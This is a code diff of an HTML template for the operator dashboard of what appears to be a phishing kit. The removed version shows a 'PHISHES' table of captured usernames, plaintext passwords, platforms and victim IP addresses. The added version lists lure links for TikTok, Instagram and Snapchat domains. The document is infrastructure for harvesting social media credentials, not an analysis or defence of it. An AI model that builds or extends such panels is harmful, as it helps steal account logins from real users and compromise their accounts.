@@ -1,12 +1,13 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
-	<title>Phishing logs</title>
+	<title>Phishing links</title>
 	<!-- core:css -->
-	<link rel="stylesheet" href="{{ url_for('static', filename='vendors/core/core.css') }}">
+	<link rel="stylesheet" href="{{url_for('static', filename='vendors/core/core.css')}}">
 	<!-- endinject -->
   <!-- plugin css for this page -->
 	<link rel="stylesheet" href="{{url_for('static', filename='vendors/bootstrap-datepicker/bootstrap-datepicker.min.css')}}">
@@ -18,7 +19,7 @@
   <!-- Layout styles -->  
 	<link rel="stylesheet" href="{{url_for('static', filename='css/demo_2/style.css')}}">
   <!-- End layout styles -->
-  <link rel="shortcut icon" href="{{url_for('static', filename='images/favicon.png') }}" />
+  <link rel="shortcut icon" href="{{url_for('static', filename='images/favicon.png')}}" />
 </head>
 <body>
 	<div class="main-wrapper">
@@ -95,49 +96,63 @@
 
         <div class="d-flex justify-content-between align-items-center flex-wrap grid-margin">
           <div>
-            <h4 class="mb-3 mb-md-0">Welcome to Logs</h4>
+            <h4 class="mb-3 mb-md-0">Welcome to Links</h4>
           </div>
         </div>
 
         <div class="row">
-          <div class="col-md-12 grid-margin stretch-card">
-            <div class="card">
-              <div class="card-body">
-								<h6 class="card-title">PHISHES</h6>
-								<div class="table-responsive">
-										<table class="table">
-											<thead>
-												<tr>
-													<th>Username</th>
-													<th>Password</th>
-													<th>Platform</th>
-													<th>IP Address</th>
-												</tr>
-											</thead>
-											<tbody>
-                                                {% for user in users %}
-                                                    <tr>
-                                                    <td>{{user.phised_user}}</td>
-                                                    <td>{{user.phished_pword}}</td>
-                                                    <td>{{user.platform}}</td>
-                                                    <td>{{user.ip}}</td>
-                                                    </tr>
-                                                {% endfor %}
-                                                <!--
-
-                                                -->
-											</tbody>
-										</table>
-								</div>
+          <div class="col-12 col-xl-12 stretch-card">
+            <div class="row flex-grow">
+              <div class="col-md-4 grid-margin stretch-card">
+                <div class="card">
+                  <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-baseline">
+                      <h6 class="card-title mb-0">TikTok Link</h6>
+                    </div>
+                    <div class="row">
+                      <div class="col-8 col-md-12 col-xl-8">
+                        <h6 class="mb-2">https://{{TIKTOK_DOMAIN}}</h6>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-4 grid-margin stretch-card">
+                <div class="card">
+                  <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-baseline">
+                      <h6 class="card-title mb-0">Instagram Link</h6>
+                    </div>
+                    <div class="row">
+                      <div class="col-8 col-md-12 col-xl-8">
+                        <h6 class="mb-2">https://{{INSTAGRAM_DOMAIN}}</h6>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-4 grid-margin stretch-card">
+                <div class="card">
+                  <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-baseline">
+                      <h6 class="card-title mb-0">Snapchat Link</h6>
+                    </div>
+                    <div class="row">
+                      <div class="col-8 col-md-12 col-xl-8">
+                        <h6 class="mb-2">https://{{SNAPCHAT_DOMAIN}}</h6>
+                      </div>
+                    </div>
+                  </div>
+                </div>
               </div>
             </div>
-					</div>
-					</div>
+          </div>
         </div> <!-- row -->
+			</div>
 
 			<!-- partial:partials/_footer.html -->
 			<footer class="footer d-flex flex-column flex-md-row align-items-center justify-content-between">
-				<p class="text-muted text-center text-md-left">astute</p>
+				<p class="text-muted text-center text-md-left">nemo</p>
 				<p class="text-muted text-center text-md-left mb-0 d-none d-md-block">Handcrafted With <i class="mb-1 text-primary ml-1 icon-small" data-feather="heart"></i></p>
 			</footer>
 			<!-- partial -->
@@ -146,7 +161,7 @@
 	</div>
 
 	<!-- core:js -->
-	<script src="{{ url_for('static', filename='vendors/core/core.js') }}"></script>
+	<script src="{{url_for('static', filename='vendors/core/core.js')}}"></script>
 	<!-- endinject -->
   <!-- plugin js for this page -->
   <script src="{{url_for('static', filename='vendors/chartjs/Chart.min.js')}}"></script>
@@ -165,5 +180,4 @@
   <script src="{{url_for('static', filename='js/datepicker.js')}}"></script>
 	<!-- end custom js for this page -->
 </body>
-</html>    
-© 2020 GitH
+</html>
